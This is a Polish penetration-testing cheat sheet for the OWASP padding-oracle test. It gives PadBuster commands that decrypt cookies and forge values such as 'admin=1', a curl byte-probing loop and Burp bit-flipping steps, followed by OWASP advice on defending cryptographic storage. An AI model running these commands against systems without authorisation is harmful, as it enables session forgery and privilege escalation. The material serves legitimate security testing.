# WSTG-CRYP-02 — Testing for Padding Oracle

## Cele

- Zidentyfikowac zaszyfrowane wiadomosci z paddingiem (np. CBC mode)
- Probowac zlamac padding w celu odszyfrowania/modyfikacji danych

## KOMENDY

### PadBuster - automatyczny atak padding oracle

```bash
# Przyklad: atak na zaszyfrowany cookie
padbuster TARGET/page ENCRYPTED_COOKIE_VALUE 8 -cookies "auth=ENCRYPTED_COOKIE_VALUE"

```

### PadBuster z blokiem 16 bajtow (AES)

```bash
padbuster TARGET/page ENCRYPTED_VALUE 16

```

### PadBuster - odszyfrowanie

```bash
padbuster TARGET/page ENCRYPTED_VALUE 8 -plaintext "user=admin"

```

### PadBuster - szyfrowanie nowej wartosci

```bash
padbuster TARGET/page ENCRYPTED_VALUE 8 -plaintext "admin=1" -encoding 0

```

### PadBuster z roznymi encodings

```bash
# 0 = Base64, 1 = Lowercase HEX, 2 = Uppercase HEX, 3 = .NET URL Token, 4 = WebSafe Base64
padbuster TARGET/page ENCRYPTED_VALUE 8 -encoding 0
padbuster TARGET/page ENCRYPTED_VALUE 8 -encoding 1

```

### curl - manualne testowanie roznic w odpowiedziach na padding

```bash
# Prawidlowy padding (oryginalny ciphertext):
curl -v TARGET/page -H "Cookie: token=VALID_ENCRYPTED_VALUE"

# Zmodyfikowany ostatni bajt (zly padding):
curl -v TARGET/page -H "Cookie: token=MODIFIED_ENCRYPTED_VALUE"

```

### Porownanie odpowiedzi (czas, kod statusu, tresc)

```bash
# Prawidlowy padding vs nieprawidlowy padding - roznice wskazuja na padding oracle
for i in $(seq 0 255); do
    HEX=$(printf '%02x' $i)
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}:%{time_total}" TARGET/page -H "Cookie: token=MODIFIED_${HEX}")
    echo "Byte $HEX: $RESPONSE"
done

```

### Burp Intruder - bit-flipping atak

```bash
# 1. Przechwytuj request z zaszyfrowanym parametrem
# 2. Wyslij do Intruder
# 3. Ustaw pozycje na ostatni blok ciphertextu
# 4. Uzywaj Bit Flipper payload type
# 5. Analizuj roznice w odpowiedziach

```

## KOMENDY Z WORDLISTAMI

### Brak dedykowanych wordlist - atak oparty na kryptoanalizie

```bash

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj zaszyfrowane wartosci w cookies, hidden fields, URL parametrach
```bash
   (zwykle Base64 lub HEX, dlugosc podzielna przez 8 lub 16)
```

2. W Burp Suite -> Repeater: zmien ostatni bajt ciphertextu i obserwuj odpowiedz
3. Porownaj odpowiedzi: rozny blad (np. 500 vs 200 vs 403) wskazuje na padding oracle
4. Zmierz czas odpowiedzi - roznice czasowe moga wskazywac na timing-based padding oracle
5. Sprawdz czy aplikacja uzywa CBC mode (podatny na padding oracle)
6. Sprawdz czy istnieje ViewState (ASP.NET) - czesty cel padding oracle
7. Testuj rozne pozycje bitow w ciphertekscie dla potwierdzenia podatnosci


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Cryptographic_Storage_Cheat_Sheet.md

### Authenticated Encryption — obrona przed padding oracle

- **AES-GCM** (REKOMENDOWANY) — zapewnia poufnosc + integralnosc + autentycznosc w jednej operacji
- **ChaCha20-Poly1305** — alternatywa, dobra wydajnosc na urzadzeniach bez AES-NI
- **CCM** — kolejna opcja authenticated encryption
- Authenticated modes ELIMINUJA padding oracle — nie ma osobnego kroku walidacji padding

### Dlaczego CBC jest podatny

- CBC (Cipher Block Chaining) wymaga osobnej walidacji padding (PKCS#7)
- Jesli serwer rozroznia "zly padding" od "zla wartosc" — atakujacy dekryptuje ciphertext bajt po bajcie
- Roznice moga byc: rozny kod HTTP (500 vs 200), rozny czas odpowiedzi, rozny komunikat bledu
- **Encrypt-then-MAC**: jesli MUSISZ uzyc CBC — oblicz HMAC na ciphertext PRZED dekrypcja, zweryfikuj HMAC first

### Bezpieczne porownywanie MAC/HMAC

- Uzywaj **constant-time comparison** — obrona przed timing attacks
- Python: `hmac.compare_digest()`, Java: `MessageDigest.isEqual()`, PHP: `hash_equals()`
- NIGDY nie porownuj hashow przez `==` lub `equals()` — timing side-channel

### Algorytmy szyfrowania symetrycznego

- **AES-128** minimum, **AES-256** preferowany, z trybem **GCM** lub **CCM**
- **NIGDY**: DES, 3DES, RC4, Blowfish (przestarzale, slabe klucze)
- **NIGDY**: tryb **ECB** — ten sam plaintext daje ten sam ciphertext (wzorce widoczne)

### Algorytmy asymetryczne

- **ECC Curve25519** (preferowany) lub **RSA >= 2048 bit**
- RSA: ZAWSZE uzywaj **OAEP padding** (Optimal Asymmetric Encryption Padding) — obrona przed known plaintext attacks
- NIGDY: RSA z PKCS#1 v1.5 padding — podatny na Bleichenbacher attack

### Secure Random Number Generation

- Kryptograficznie bezpieczne PRNG (CSPRNG) dla kluczy, IV, tokenow:
  - Java: `SecureRandom`, Python: `secrets`, PHP: `random_bytes()`, Node: `crypto.randomBytes()`
  - C: `getrandom(2)`, .NET: `RandomNumberGenerator`, Go: `crypto/rand`
- **NIGDY**: `Math.random()`, `rand()`, `mt_rand()` — przewidywalne, NIE do kryptografii

### Zarzadzanie kluczami

- Przechowuj klucze ODDZIELNIE od zaszyfrowanych danych (np. klucze na filesystem, dane w DB)
- Uzywaj **Key Encryption Key (KEK)** do szyfrowania **Data Encryption Key (DEK)** — envelope encryption
- Rotuj klucze: po kompromitacji, po uplywie cryptoperiod, po zaszyfrowaniu duzej ilosci danych
- Przechowuj klucze w: HSM, AWS KMS, Azure Key Vault, HashiCorp Vault — NIE w kodzie zrodlowym
- NIE hard-coduj kluczy w kodzie, NIE commituj do VCS, NIE przechowuj w env vars (phpinfo exposure)

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Padding Oracle Hunter | Wykrywanie i eksploatacja podatnosci Padding Oracle | [GitHub](https://github.com/AresS31/padding-oracle-hunter) |
| Crypto Attacker | Narzedzie do atakow kryptograficznych | [GitHub](https://github.com/PortSwigger/crypto-attacker) |
